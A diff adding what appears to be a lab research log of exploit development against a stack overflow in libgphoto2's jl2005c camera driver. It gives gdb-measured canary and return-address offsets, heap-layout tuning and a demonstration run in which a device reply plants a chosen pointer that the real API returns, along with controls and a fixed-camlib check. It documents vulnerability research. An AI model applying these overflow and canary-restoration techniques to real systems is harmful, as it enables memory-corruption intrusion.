@@ -1,0 +1,119 @@
+# W171 (2026-11-24): device-chosen pointer dereferenced after a normal return
+
+# W170 left one lane open: its device-chosen CameraFile data pointer was read
+# back through gp_file_get_data_and_size() only after diverting jl2005c_init
+# to finish(). W171 asks whether the pointer survives a NORMAL return into
+# camera_init, with gp_camera_init completing, and whether it can then be
+# dereferenced to chosen bytes.
+
+## Measured frame geometry (plain -O0 -g -fno-omit-frame-pointer build)
+# gdb breakpoint at jl2005c_init entry (first executable line, +58):
+#   r1 = jl2005c_init rbp; info = r1-0x4030, read destination info+0x200.
+#   r2 = *(r1) = camera_init rbp; r1+8 = saved RIP (camera_init+952, 0x...4a80).
+#   camera_init canary is at r2-0x18 (NOT r2-8: r2-8 holds saved rbx).
+#   camera_init saved rbx/rbp/RIP are at r2-8 / r2 / r2+8.
+# Bulk offset B maps to r1-0x3E30+B, so:
+#   jl2005c_init canary/saved rbp/saved RIP : B = 0x3E28 / 0x3E30 / 0x3E38
+#   camera_init canary                     : B = 0x3EF8
+#   camera_init saved rbx/rbp/RIP          : B = 0x3F08 / 0x3F10 / 0x3F18
+# The :152 overflow fills these with 0x41 unless the reply restores them.
+# The caller canary restore is essential: without it the process aborts in
+# camera_init with "*** stack smashing detected ***". With it, but without
+# the caller saved rbx/rbp/RIP restores, camera_init faults at its ret with
+# a 0x4141414141414141 return address.
+
+## Heap layout
+# The five gdb inferior calls (setenv/snprintf) shift the heap. With the
+# gdb-injected frame values, drain=24 puts the victim at priv+0x4370, out of
+# reach of the 0x4000-byte reply: the victim is then observed fresh (refcount
+# 1, zero data/size) and the deref yields nothing. Measured sweep:
+#   drain=20 -> priv-0x5a0; 21 -> priv-0x410; 22 -> priv+0x4050;
+#   23 -> priv+0x41e0; 24 -> priv+0x4370; 25 -> priv+0x4500; 26 -> priv+0x4690.
+# drain=22 restores W170's layout, so bulk 0x3F90/0x3F98/0x3FA0 again steer
+# the victim's accesstype/size/data.
+
+## Build (paths relative to the repository root)
+# Plain tree src/libgphoto2-2.5.34-plain, configured as in REAL-BUILD.md with
+# live/vusb-jl2005.patch applied. Local-only incremental patch below applies
+# on top of evidence/replay-vusb-victim.patch (dry-run `patch -p1` OK from the
+# patched source root):
+#   evidence/replay-vusb-normal-return.patch
+#   evidence/replay-normal_return_probe.c  -> live/normal_return_probe.c
+#   evidence/replay-normal-return.gdb      -> gdb -batch -x script ./live/normal_return_probe
+#   cd src/libgphoto2-2.5.34-plain
+#   make -C libgphoto2_port && make -C libgphoto2_port install
+#   P=$PWD/installdir-plain
+#   gcc -O0 -g -rdynamic -fno-omit-frame-pointer -I$P/include \
+#     -o ../../live/normal_return_probe ../../live/normal_return_probe.c \
+#     -L$P/lib -lgphoto2 -lgphoto2_port -Wl,-rpath,$P/lib
+# Env for every run:
+#   CAMLIBS=$P/lib/libgphoto2/2.5.34
+#   IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb
+#   LD_LIBRARY_PATH=$P/lib   port usb:001,001
+# The probe sets the process canary, a marker buffer address/length and a
+# finish() fallback RIP; the gdb script at the jl2005c_init breakpoint
+# overrides M2SHELL_JL2005_RBP, M2SHELL_JL2005_RIP, M2SHELL_VUSB_CALLER_RBX,
+# M2SHELL_VUSB_CALLER_RBP and M2SHELL_VUSB_CALLER_RIP with the live stack
+# values. The canary is NOT overridden: it is the probe's own %fs:0x28.
+
+## Attack: normal return, real API returns chosen pointer, deref yields marker
+$ env ... M2SHELL_JL2005_VUSB=v M2SHELL_JL2005_COUNT=1022 \
+    M2SHELL_VUSB_DRAIN=22 M2SHELL_VUSB_RESTORE_CALLER_CANARY=1 \
+    M2SHELL_VUSB_ACCESSTYPE=0 \
+    gdb -q -batch -x evidence/replay-normal-return.gdb ./live/normal_return_probe
+M2S_ENV M2SHELL_JL2005_CANARY=0x477c183f2516aa00
+M2S_ENV M2SHELL_JL2005_RIP=0x00005555555553fd        # finish fallback, overridden
+M2S_ENV M2SHELL_VUSB_DATA=0x555555556010             # probe marker buffer
+M2S_ENV M2SHELL_JL2005_RBP=0x7fffffffd390            # gdb: camera_init rbp
+M2S_ENV M2SHELL_JL2005_RIP=0x7ffff7bf4a80            # gdb: real saved RIP
+M2S_ENV M2SHELL_VUSB_CALLER_RBX=0x555555559d90
+M2S_ENV M2SHELL_VUSB_CALLER_RBP=0x7fffffffde30
+M2S_ENV M2SHELL_VUSB_CALLER_RIP=0x7ffff7f3a0f3
+VUSB_VICTIM 0x555555568060
+GP_CAMERA_INIT rc=0                                  # normal return, not diversion
+VICTIM_AT_CONSUMER+150 = 0x0000000000000000          # chosen accesstype = MEMORY
+VICTIM_AT_CONSUMER+158 = 0x000000000000001d          # chosen size = 29
+VICTIM_AT_CONSUMER+160 = 0x0000555555556010          # chosen data pointer
+CONSUMER_GET rc=0 data=0x555555556010 size=0x1d      # real gp_file_get_data_and_size
+DEREF_READBACK bytes=29 text=M2SHELL_DEREF_MARKER_20261124
+NORMAL_RETURN_COMPLETE
+Inferior exited normally, rc=0.
+
+## Controls
+safe fill (M2SHELL_JL2005_FILL=0x00, data=0, size=0), same gdb frame values:
+    GP_CAMERA_INIT rc=0; CONSUMER_GET rc=0 data=(nil) size=0x0;
+    DEREF_SKIP no usable pointer; NORMAL_RETURN_COMPLETE.
+count=100 (no oversized read):
+    GP_CAMERA_INIT rc=0; CONSUMER_SKIP no victim; NORMAL_RETURN_COMPLETE.
+wrong canary (M2SHELL_JL2005_CANARY=0xdeadbeefdeadbeef):
+    *** stack smashing detected ***; SIGABRT before any diversion or consumer.
+fixed camlib (pins/fix-6a3393d.patch applied, camlib rebuilt):
+    no 16384-byte bulk read, no VUSB_VICTIM, CONSUMER_SKIP no victim,
+    GP_CAMERA_INIT rc=0. Fix reversed and camlib rebuilt: attack again returns
+    the chosen pointer, size and marker text.
+omitted caller canary restore: *** stack smashing detected *** in camera_init.
+omitted caller rbx/rbp/RIP restores: SIGSEGV at camera_init ret with a
+    0x4141414141414141 return address.
+drain=24 (wrong layout): victim at priv+0x4370, fields remain fresh,
+    CONSUMER_GET rc=0 data=(nil) size=0x0.
+
+## Negative: gphoto2's own consumer aborts on the corrupted top chunk
+With M2SHELL_TRY_SAVE=1 the probe calls gp_file_save() after the same
+CONSUMER_GET. It prints "malloc(): corrupted top size" and SIGABRT before
+writing any bytes (0-byte output file). The dereference demonstrated here is
+therefore the probe's own read of the API-returned pointer, not a successful
+gphoto2-side write. The device's 0x41 fill corrupts the top-chunk header.
+
+## Disposition
+Rung 4 strengthened at the real-build scope: a device reply + lab-known
+canary/frame values lets jl2005c_init return normally through the real
+camera_init, gp_camera_init completes, and a device-chosen pointer with a
+chosen length survives in a live CameraFile; the real gp_file_get_data_and_size
+returns them and dereferencing the pointer yields the device-chosen 29-byte
+marker. Controls: safe fill, count 100, wrong canary, fixed/reversed camlib
+and two omitted-restore failures. This is NOT rung 5: canary and every saved
+register are read by gdb from the live process, victim placement is a lab
+hook, the canary is not device-recovered, no physical USB/wire/consumer
+network path exists, no command runs, gphoto2's own file consumer aborts on
+heap corruption, and there is no independent witness replay of W171.
+Rung 5 stays UNKNOWN.
